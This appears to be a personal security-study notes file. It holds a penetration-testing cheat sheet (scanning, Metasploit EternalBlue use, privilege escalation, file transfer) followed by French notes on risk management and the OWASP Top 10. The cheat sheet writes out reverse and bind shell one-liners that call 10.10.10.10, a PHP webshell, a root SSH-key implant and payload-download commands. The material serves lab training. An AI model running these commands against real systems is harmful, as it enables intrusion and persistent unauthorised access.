# infosec

## sheetcheat

### Service Scanning
| Description        | Command      |
| ------ | ----- |
| Show our IP address | ``ifconfig/ip a`` |
| Run nmap on an IP | `` nmap 10.129.42.253 `` |
| Run an nmap script scan on an IP | `` nmap -sV -sC -p- 10.129.42.253 `` |
| List various available nmap scripts | `` locate scripts/citrix	  `` |
| Run an nmap script on an IP | `` nmap --script smb-os-discovery.nse -p445 10.10.10.40 `` |
| Grab banner of an open port | `` netcat 10.10.10.10 22 `` |
| List SMB Shares | `` smbclient -N -L \\\\10.129.42.253 `` |
| Connect to an SMB share | `` smbclient \\\\10.129.42.253\\users `` |
| Scan SNMP on an IP | `` snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 `` |
| Brute force SNMP secret string | `` onesixtyone -c dict.txt 10.129.42.254 `` |

### Web Enumeration
| Description        | Command      |
| ------ | ----- |
| Run a directory scan on a website | `` gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt `` |
| Run a sub-domain scan on a website | `` gobuster dns -d example.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt `` |
| Grab website banner | `` curl -IL https://www.example.com `` |
| List details about the webserver/certificates | `` whatweb 10.10.10.121 `` |
| List potential directories in robots.txt | `` curl 10.10.10.121/robots.txt `` |

### Public exploit
| Description        | Command      |
| ------ | ----- |
| Search for public exploits for a web application	 | ``searchsploit openssh 7.2	 `` |
| MSF: Start the Metasploit Framework | `` msfconsole `` |
| MSF: Search for public exploits in MSF | `` search exploit eternalblue	 `` |
| MSF: Start using an MSF module | `` use exploit/windows/smb/ms17_010_psexec `` |
| MSF: Show required options for an MSF module | `` show options `` |
| MSF: Set a value for an MSF module option | `` set RHOSTS 10.10.10.40		 `` |
| MSF: Test if the target server is vulnerable | `` check	 `` |
| MSF: Run the exploit on the target server is vulnerable | `` exploit `` |

### Using Shells
| Description        | Command      |
| ------ | ----- |
| Start a nc listener on a local port | `` nc -lvnp 1234 `` |
| Send a reverse shell from the remote server | `` bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' `` |
| Another command to send a reverse shell from the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f `` |
| Start a bind shell on the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f `` |
| Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234	 `` |
| Upgrade shell TTY (1) | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
| Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
| Create a webshell php file | `` echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php `` |
| Execute a command on an uploaded webshell | `` curl http://SERVER_IP:PORT/shell.php?cmd=id `` |

### Privilege Escalation
| Description        | Command      |
| ------ | ----- |
| Run linpeas script to enumerate remote server | `` ./linpeas.sh	 `` |
| List available sudo privileges | `` sudo -l `` |
| Run a command with sudo | `` sudo -u user /bin/echo Hello World! `` |
| Switch to root user (if we have access to sudo su) | `` sudo su -	`` |
| Switch to a user (if we have access to sudo su) | `` sudo su user - `` |
| Create a new SSH key | `` ssh-keygen -f key	`` |
| Add the generated public key to the user | `` echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys `` |
| SSH to the server with the generated private key | `` ssh root@10.10.10.10 -i key	`` |

### Transferring Files
| Description        | Command      |
| ------ | ----- |
| Start a local webserver | `` python3 -m http.server 8000	`` |
| Download a file on the remote server from our local machine | `` wget http://10.10.14.1:8000/linpeas.sh	`` |
| Download a file on the remote server from our local machine | `` curl http://10.10.14.1:8000/linenum.sh -o linenum.sh	`` |
| Start a local webserver | `` python3 -m http.server 8000	`` |
| Transfer a file to the remote server with scp (requires SSH access) | `` scp linenum.sh user@remotehost:/tmp/linenum.sh	`` |
| Convert a file to base64 | `` base64 shell -w 0	`` |
| Convert a file from base64 back to its orig | ``echo f0VMR...SNIO...InmDwU | base64 -d > shell `` |
| Check the file's md5sum to ensure it converted correctly | `` md5sum shell `` |

## Risk Management Process

**- Identifying the Risk:**
Identifier les risques auxquels l'entreprise est exposée, tels que les risques juridiques, environnementaux, de marché, réglementaires et autres.

**- Analyze the Risk:**
Analyser les risques pour déterminer leur impact et leur probabilité. Les risques doivent être mis en correspondance avec les diverses politiques, procédures et processus opérationnels de l'organisation.

**- Evaluate the Risk:**
Évaluer, classer et hiérarchiser les risques. Ensuite, l'organisation doit décider d'accepter (inévitable), d'éviter (changer les plans), de contrôler (atténuer) ou de transférer le risque (assurer).

**- Dealing with Risk:**
Éliminer ou contenir au mieux les risques. Ceci est géré en s'interface directement avec les parties prenantes pour le système ou le processus auquel le risque est associé.

**- Monitoring Risk:**
Tous les risques doivent être surveillés en permanence. Les risques doivent être surveillés en permanence pour détecter tout changement de situation susceptible de modifier leur score d'impact, from low to medium or high impact.

To do:
- Re-setup une VM entre chaque client pour ne pas mélanger les clients.
- On doit pouvoir setup une VM rapidement.

## Top OWASP

**- Injection:**
Injection SQL, injection de commandes, injection LDAP, etc.

**- Broken Auhtentification:**
Les erreurs de configuration de l'authentification et de la gestion des sessions peuvent conduire à un accès non autorisé à une application par le biais d'attaques de devinette de mot de passe ou d'un délai d'expiration de session incorrect, entre autres problèmes.

**- Sensitive Data Exposure:**
Protéger de manière inappropriée les données telles que les informations financières, de santé ou personnellement identifiables.

**- XML External Entities:**
Processeurs XML mal configurés pouvant entraîner la divulgation de fichiers internes, l'analyse des ports, l'exécution de code à distance ou des attaques par déni de service.


**- Broken Access control:**
Les restrictions ne sont pas mises en œuvre de manière appropriée pour empêcher les utilisateurs d'accéder à d'autres comptes d'utilisateurs, d'afficher des données sensibles, d'accéder à des fonctionnalités non autorisées, de modifier des données, etc.

**- Security misconfiguration:**
Configurations par défaut non sécurisées, stockage en nuage ouvert, messages d'erreur verbeux qui divulguent trop d'informations.

**- Cross-site Scripting XSS:**
XSS se produit lorsqu'une application ne nettoie pas correctement les entrées fournies par l'utilisateur, permettant l'exécution de HTML ou de JavaScript dans le navigateur d'une victime. Cela peut entraîner un piratage de session, une dégradation du site Web, une redirection d'un utilisateur vers un site Web malveillant, etc.

**- Insecure Deserialization:**
Cette faille conduit souvent à l'exécution de code à distance, à des attaques par injection ou à des attaques par élévation de privilèges.

**- Using component with known vulnerabilities:**
Tous les composants utilisés par une application (bibliothèques, frameworks, modules logiciels) s'exécutent avec le même privilège que l'application. Si l'application utilise des composants présentant des défauts connus, cela peut entraîner l'exposition de données sensibles ou l'exécution de code à distance.

**- Insufficient Logging & monitoring:**
Des lacunes dans la journalisation et la surveillance peuvent permettre à une attaque réussie de passer inaperçue, aux attaquants d'établir la persistance dans le réseau, ou de falsifier ou d'extraire des données sensibles sans se faire remarquer.
